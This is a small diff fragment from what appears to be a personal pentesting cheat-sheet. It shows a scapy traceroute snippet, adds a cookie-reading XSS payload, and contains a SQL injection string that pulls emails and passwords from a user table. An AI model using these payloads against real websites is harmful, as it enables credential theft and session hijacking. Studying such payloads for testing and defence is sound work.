@@ -249,8 +249,8 @@ for element in clients:
 from scapy.all import * result,unanswered=traceroute(["www.example.com","www.google.com"],maxttl=20) 
 result.show()
 =================================================================================
-
-C)
+<script>alert(document.cookie)</script>
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 xx' IN(itemnum,sdesc,ldesc) UNION SELECT email,passwd,123,123 FROM userdb LIMIT 2 --
 
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
